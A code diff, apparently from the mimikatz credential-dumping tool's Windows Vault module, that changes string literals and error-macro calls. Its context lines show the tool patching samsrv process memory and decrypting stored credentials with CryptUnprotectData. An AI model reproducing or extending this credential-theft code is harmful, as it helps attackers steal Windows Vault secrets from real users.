@@ -20,8 +20,8 @@ BOOL isVaultInit = FALSE;
 DWORD sizeOfStruct;
 
 const KUHL_M_C kuhl_m_c_vault[] = {
-	{kuhl_m_vault_list,	L"list",	L"list"},
-	{kuhl_m_vault_cred,	L"cred",	L"cred"},
+	{kuhl_m_vault_list,	"list",	"list"},
+	{kuhl_m_vault_cred,	"cred",	"cred"},
 };
 const KUHL_M kuhl_m_vault = {
 	L"vault",	L"Windows Vault/Credential module", NULL,
@@ -234,7 +234,7 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 					else PRINT_ERROR(L"RegOpenKeyEx SID : %08x\n", dwError);
 					LocalFree(sid);
 				}
-				else PRINT_ERROR_AUTO(L"ConvertSidToStringSid");
+				else PRINT_ERROR_AUTO_C("ConvertSidToStringSid");
 				RegCloseKey(hPicturePassword);
 			}
 			else PRINT_ERROR(L"RegOpenKeyEx PicturePassword : %08x\n", dwError);
@@ -475,13 +475,13 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 							sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
 							isPatching = TRUE;
 							if(!kull_m_patch(&sMemory, &aPatternMemory, CredpCloneCredentialReference->Search.Length, &aPatchMemory, CredpCloneCredentialReference->Patch.Length, CredpCloneCredentialReference->Offsets.off0, kuhl_m_vault_cred, argc, argv, NULL))
-								PRINT_ERROR_AUTO(L"kull_m_patch");
+								PRINT_ERROR_AUTO_C("kull_m_patch");
 							isPatching = FALSE;
-						} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+						} else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName");
 						kull_m_memory_close(hMemory);
 					}
-				} else PRINT_ERROR_AUTO(L"OpenProcess");
-			} else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
+				} else PRINT_ERROR_AUTO_C("OpenProcess");
+			} else PRINT_ERROR_AUTO_C("kull_m_service_getUniqueForName");
 		}
 	}
 	else
@@ -552,7 +552,7 @@ void kuhl_m_vault_cred_tryEncrypted(PCREDENTIAL pCredential)
 					kprintf(L"\n");
 					LocalFree(out.pbData);
 				}
-				else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+				else PRINT_ERROR_AUTO_C("CryptUnprotectData");
 			}
 		}
 	}
@@ -576,7 +576,7 @@ void kuhl_m_vault_cred_tryEncrypted(PCREDENTIAL pCredential)
 						kprintf(L"\n");
 						LocalFree(out.pbData);
 					}
-					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+					else PRINT_ERROR_AUTO_C("CryptUnprotectData");
 				}
 				if(pAppDN->unkBlobSize)
 				{
@@ -590,7 +590,7 @@ void kuhl_m_vault_cred_tryEncrypted(PCREDENTIAL pCredential)
 						kprintf(L"\n");
 						LocalFree(out.pbData);
 					}
-					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+					else PRINT_ERROR_AUTO_C("CryptUnprotectData");
 				}
 			}
 		}
